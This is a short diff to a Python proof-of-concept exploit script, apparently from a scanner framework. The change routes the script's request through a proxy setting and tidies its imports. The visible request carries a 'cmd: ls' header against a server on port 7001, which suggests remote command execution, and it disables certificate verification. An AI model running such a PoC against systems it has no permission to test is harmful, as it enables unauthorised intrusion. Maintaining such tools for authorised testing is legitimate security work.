@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 # _*_ coding:utf-8 _*_
 
-import sys
-import requests
-from Config.config_requests import ua
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+import requests
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
+requests.packages.urllib3.disable_warnings()
 
 # 脚本信息
 ######################################################
@@ -25,7 +25,7 @@ def poc(target):
     cmd: ls
     Host: 127.0.0.1:7001
     '''
-    r = requests.post(vuln_url, headers=headers,data=data,verify=False,timeout=3)
+    r = requests.post(vuln_url, headers=headers,data=data,verify=False,timeout=3,proxies=proxies)
     try:
         if r.status_code ==200:
             result['target'] = target
